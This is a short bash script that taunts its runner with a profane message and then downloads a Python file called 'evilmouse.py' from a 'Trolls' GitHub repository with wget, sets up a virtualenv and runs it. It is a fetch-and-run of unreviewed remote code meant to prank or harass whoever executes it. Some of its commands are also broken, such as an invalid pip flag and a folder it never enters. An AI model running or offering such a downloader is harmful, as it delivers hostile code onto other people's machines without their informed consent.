#! /usr/bin/bash

echo "Fuck your life. You will be running evilmouse in a minny"
cd
cd "/Desktop"
mkdir evilmouse
wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/evilmouse.py
virtualenv venv
. venv/bin/activate
pip3 install -R requirements.txt
python3 evilmouse.py
